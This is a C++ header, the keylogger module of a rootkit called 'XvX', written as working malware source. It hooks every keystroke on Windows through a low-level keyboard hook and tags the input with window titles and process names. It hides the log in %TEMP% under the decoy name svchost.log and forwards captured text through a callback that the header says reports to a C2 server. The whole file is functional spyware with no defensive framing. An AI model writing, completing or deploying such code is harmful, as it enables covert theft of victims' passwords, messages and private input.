/*
 * XvX Rootkit - Keylogger Module
 *
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Low-level keyboard hook to capture keystrokes.
 * Logs all keyboard input and sends to C2 server.
 */

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <string>
#include <sstream>
#include <fstream>
#include <vector>
#include <map>
#include <chrono>
#include <iomanip>

using namespace std;

class Keylogger
{
private:
    static HHOOK g_hKeyHook;
    static wstring g_keyBuffer;
    static bool g_isActive;
    static HANDLE g_hMutex;
    static void (*g_callback)(const wstring &);
    static wstring g_logFilePath;
    static wstring g_currentWindow;
    static bool g_logToFile;

    // Map virtual keys to readable strings
    static wstring getKeyName(DWORD vkCode, bool shift)
    {
        static map<DWORD, wstring> specialKeys = {
            {VK_BACK, L"[BACKSPACE]"},
            {VK_RETURN, L"[ENTER]\n"},
            {VK_SPACE, L" "},
            {VK_TAB, L"[TAB]"},
            {VK_SHIFT, L""},
            {VK_CONTROL, L""},
            {VK_MENU, L""}, // ALT
            {VK_CAPITAL, L"[CAPSLOCK]"},
            {VK_ESCAPE, L"[ESC]"},
            {VK_PRIOR, L"[PGUP]"},
            {VK_NEXT, L"[PGDN]"},
            {VK_END, L"[END]"},
            {VK_HOME, L"[HOME]"},
            {VK_LEFT, L"[LEFT]"},
            {VK_UP, L"[UP]"},
            {VK_RIGHT, L"[RIGHT]"},
            {VK_DOWN, L"[DOWN]"},
            {VK_SNAPSHOT, L"[PRTSC]"},
            {VK_INSERT, L"[INS]"},
            {VK_DELETE, L"[DEL]"},
            {VK_LWIN, L"[WIN]"},
            {VK_RWIN, L"[WIN]"},
            {VK_F1, L"[F1]"},
            {VK_F2, L"[F2]"},
            {VK_F3, L"[F3]"},
            {VK_F4, L"[F4]"},
            {VK_F5, L"[F5]"},
            {VK_F6, L"[F6]"},
            {VK_F7, L"[F7]"},
            {VK_F8, L"[F8]"},
            {VK_F9, L"[F9]"},
            {VK_F10, L"[F10]"},
            {VK_F11, L"[F11]"},
            {VK_F12, L"[F12]"}};

        // Check if it's a special key
        auto it = specialKeys.find(vkCode);
        if (it != specialKeys.end())
        {
            return it->second;
        }

        // Check if it's a printable character
        if (vkCode >= 0x30 && vkCode <= 0x5A)
        { // 0-9, A-Z
            wchar_t ch = (wchar_t)vkCode;

            // Handle shift for numbers (symbols)
            if (shift && vkCode >= 0x30 && vkCode <= 0x39)
            {
                static wstring shiftNumbers = L")!@#$%^&*(";
                return wstring(1, shiftNumbers[vkCode - 0x30]);
            }

            // Lowercase letters if shift not pressed
            if (!shift && vkCode >= 0x41 && vkCode <= 0x5A)
            {
                ch = towlower(ch);
            }

            return wstring(1, ch);
        }

        // Numpad
        if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
        {
            return wstring(1, L'0' + (vkCode - VK_NUMPAD0));
        }

        // Special characters
        static map<DWORD, pair<wstring, wstring>> charKeys = {
            {VK_OEM_1, {L";", L":"}},      // ;:
            {VK_OEM_PLUS, {L"=", L"+"}},   // =+
            {VK_OEM_COMMA, {L",", L"<"}},  // ,<
            {VK_OEM_MINUS, {L"-", L"_"}},  // -_
            {VK_OEM_PERIOD, {L".", L">"}}, // .>
            {VK_OEM_2, {L"/", L"?"}},      // /?
            {VK_OEM_3, {L"`", L"~"}},      // `~
            {VK_OEM_4, {L"[", L"{"}},      // [{
            {VK_OEM_5, {L"\\", L"|"}},     // \|
            {VK_OEM_6, {L"]", L"}"}},      // ]}
            {VK_OEM_7, {L"'", L"\""}}      // '"
        };

        auto charIt = charKeys.find(vkCode);
        if (charIt != charKeys.end())
        {
            return shift ? charIt->second.second : charIt->second.first;
        }

        return L"";
    }

    // Get active window title
    static wstring GetActiveWindowTitle()
    {
        HWND hwnd = GetForegroundWindow();
        if (hwnd == NULL)
            return L"[Unknown Window]";

        wchar_t windowTitle[256];
        GetWindowTextW(hwnd, windowTitle, 256);

        // Get process name
        DWORD processId;
        GetWindowThreadProcessId(hwnd, &processId);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        wchar_t processName[MAX_PATH];

        if (hProcess != NULL)
        {
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageNameW(hProcess, 0, processName, &size))
            {
                wstring fullPath(processName);
                size_t pos = fullPath.find_last_of(L"\\/");
                if (pos != wstring::npos)
                {
                    fullPath = fullPath.substr(pos + 1);
                }
                CloseHandle(hProcess);
                return wstring(windowTitle) + L" [" + fullPath + L"]";
            }
            CloseHandle(hProcess);
        }

        return wstring(windowTitle);
    }

    // Write log to file
    static void WriteToFile(const wstring &data)
    {
        if (!g_logToFile || g_logFilePath.empty())
            return;

        // Convert wstring path to narrow string for ofstream
        int pathSize = WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, NULL, 0, NULL, NULL);
        if (pathSize <= 0)
            return;

        char *pathBuffer = new char[pathSize];
        WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, pathBuffer, pathSize, NULL, NULL);

        ofstream logFile;
        logFile.open(pathBuffer, ios::app | ios::binary);
        delete[] pathBuffer;

        if (logFile.is_open())
        {
            // Convert wstring to UTF-8
            int size = WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, NULL, 0, NULL, NULL);
            if (size > 0)
            {
                char *buffer = new char[size];
                WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, buffer, size, NULL, NULL);
                logFile.write(buffer, size - 1);
                delete[] buffer;
            }
            logFile.close();
        }
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKb->vkCode;

            // Check if Shift is pressed
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            // For letters, combine shift and capslock
            bool shouldUppercase = shiftPressed ^ capsLock;

            wstring keyName = getKeyName(vkCode, shiftPressed);

            if (!keyName.empty())
            {
                // Thread-safe buffer access
                WaitForSingleObject(g_hMutex, INFINITE);

                // Track window changes
                wstring activeWindow = GetActiveWindowTitle();
                if (activeWindow != g_currentWindow)
                {
                    g_currentWindow = activeWindow;

                    // Get timestamp
                    auto now = chrono::system_clock::now();
                    auto timeT = chrono::system_clock::to_time_t(now);
                    tm localTime;
                    localtime_s(&localTime, &timeT);

                    wstringstream timestamp;
                    timestamp << L"\n\n[" << put_time(&localTime, L"%Y-%m-%d %H:%M:%S")
                              << L"] Window: " << g_currentWindow << L"\n";

                    g_keyBuffer += timestamp.str();
                }

                g_keyBuffer += keyName;

                // Send to callback every 10 seconds OR when buffer reaches 50 characters OR on newline
                static auto lastSend = chrono::steady_clock::now();
                auto now = chrono::steady_clock::now();
                auto elapsed = chrono::duration_cast<chrono::seconds>(now - lastSend).count();

                if (g_keyBuffer.size() >= 50 || keyName.find(L"\n") != wstring::npos || elapsed >= 10)
                {
                    wstring bufferCopy = g_keyBuffer;
                    lastSend = now;

                    // Write to local file as backup
                    WriteToFile(bufferCopy);

                    // Send to C2 if callback available
                    if (g_callback != nullptr)
                    {
                        g_callback(bufferCopy);
                    }

                    g_keyBuffer.clear();
                }

                ReleaseMutex(g_hMutex);
            }
        }

        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
    }

public:
    static bool Start(void (*callback)(const wstring &) = nullptr, bool logToFile = true, const wstring &logPath = L"")
    {
        if (g_isActive)
        {
            return false;
        }

        g_callback = callback;
        g_keyBuffer.clear();
        g_logToFile = logToFile;

        // Setup log file path
        if (logPath.empty())
        {
            // Default: %TEMP%\svchost.log (hidden file)
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            g_logFilePath = wstring(tempPath) + L"svchost.log";
        }
        else
        {
            g_logFilePath = logPath;
        }

        // Write header to log file
        if (g_logToFile)
        {
            auto now = chrono::system_clock::now();
            auto timeT = chrono::system_clock::to_time_t(now);
            tm localTime;
            localtime_s(&localTime, &timeT);

            wstringstream header;
            header << L"========================================\n"
                   << L"XvX Keylogger Session Started\n"
                   << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                   << L"========================================\n";
            WriteToFile(header.str());
        }

        g_hMutex = CreateMutexW(NULL, FALSE, NULL);

        // Install low-level keyboard hook
        g_hKeyHook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            KeyboardProc,
            GetModuleHandleW(NULL),
            0);

        if (g_hKeyHook == NULL)
        {
            CloseHandle(g_hMutex);
            return false;
        }

        g_isActive = true;
        g_currentWindow.clear();
        return true;
    }

    static void Stop()
    {
        if (!g_isActive)
        {
            return;
        }

        // Flush remaining buffer
        if (!g_keyBuffer.empty())
        {
            WaitForSingleObject(g_hMutex, INFINITE);
            wstring bufferCopy = g_keyBuffer;
            g_keyBuffer.clear();
            ReleaseMutex(g_hMutex);

            WriteToFile(bufferCopy);
            if (g_callback != nullptr)
            {
                g_callback(bufferCopy);
            }
        }

        // Write footer to log file
        if (g_logToFile)
        {
            auto now = chrono::system_clock::now();
            auto timeT = chrono::system_clock::to_time_t(now);
            tm localTime;
            localtime_s(&localTime, &timeT);

            wstringstream footer;
            footer << L"\n========================================\n"
                   << L"XvX Keylogger Session Ended\n"
                   << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                   << L"========================================\n\n";
            WriteToFile(footer.str());
        }

        if (g_hKeyHook != NULL)
        {
            UnhookWindowsHookEx(g_hKeyHook);
            g_hKeyHook = NULL;
        }

        if (g_hMutex != NULL)
        {
            CloseHandle(g_hMutex);
            g_hMutex = NULL;
        }

        g_isActive = false;
    }

    static wstring GetBuffer()
    {
        WaitForSingleObject(g_hMutex, INFINITE);
        wstring buffer = g_keyBuffer;
        g_keyBuffer.clear();
        ReleaseMutex(g_hMutex);
        return buffer;
    }

    static bool IsActive()
    {
        return g_isActive;
    }

    static wstring GetLogFilePath()
    {
        return g_logFilePath;
    }

    static void SetLogFilePath(const wstring &path)
    {
        WaitForSingleObject(g_hMutex, INFINITE);
        g_logFilePath = path;
        ReleaseMutex(g_hMutex);
    }

    static void EnableFileLogging(bool enable)
    {
        g_logToFile = enable;
    }
};

// Static member initialization
HHOOK Keylogger::g_hKeyHook = NULL;
wstring Keylogger::g_keyBuffer;
bool Keylogger::g_isActive = false;
HANDLE Keylogger::g_hMutex = NULL;
void (*Keylogger::g_callback)(const wstring &) = nullptr;
wstring Keylogger::g_logFilePath;
wstring Keylogger::g_currentWindow;
bool Keylogger::g_logToFile = true;

#endif // KEYLOGGER_H
